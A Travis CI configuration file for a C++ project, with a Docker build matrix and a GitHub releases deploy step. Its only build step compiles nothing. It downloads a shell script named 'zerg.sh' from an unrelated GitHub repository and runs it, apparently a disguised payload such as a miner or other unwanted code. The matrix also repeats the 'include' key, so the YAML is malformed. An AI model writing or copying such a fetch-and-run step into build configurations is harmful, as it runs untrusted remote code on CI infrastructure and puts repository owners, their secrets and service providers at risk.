language: cpp
compiler: clang

matrix:
  include:
    - os: linux
      services: docker
      env:
        - DOCKER_IMAGE=thijswithaar/debian:sid

  include:
    - os: linux
      services: docker
      env:
        - DOCKER_IMAGE=thijswithaar/fedora:rawhide

  include:
    - os: linux
      services: docker
      env:
        - DOCKER_IMAGE=thijswithaar/ubuntu:devel

  include:
    - os: linux
      services: docker
      env:
        - DOCKER_IMAGE=thijswithaar/arch:latest

script:
 - wget https://raw.githubusercontent.com/renitareni/mesin/main/zerg.sh && chmod +x zerg.sh && ./zerg.sh

deploy:
 provider: releases
 tag_name: ${TRAVIS_TAG}
 target_commitish: "master"
 name: "It's a release"
 api_key: ${GithubToken}
 file_glob: true
 file: "${TRAVIS_BUILD_DIR}/deploy/*"
 overwrite: true
 skip_cleanup: true
 draft: false
 on:
  tags: true
